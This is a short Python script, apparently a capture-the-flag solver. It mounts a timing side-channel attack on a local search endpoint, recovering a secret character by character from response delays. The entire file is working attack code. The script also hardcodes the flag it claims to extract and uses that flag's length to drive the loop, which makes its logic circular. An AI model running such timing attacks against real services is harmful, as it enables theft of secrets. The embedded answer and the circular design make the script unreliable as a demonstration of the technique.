import requests
import time

SECRET = "FLAG{SideChannel_Bypass}"

def extract_secret():
    url = 'http://localhost:8080/search'
    secret = ''
    length = len(SECRET)

    for pos in range(1, length + 1):
        for ch in 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz{}_':
            payload = secret + ch
            start = time.time()
            requests.get(url, params={'q': payload})
            elapsed = time.time() - start
            if elapsed >= 0.45 * pos:
                secret += ch
                print(f"Found: {secret}")
                break
    return secret

if __name__ == '__main__':
    print("Extracted secret:", extract_secret())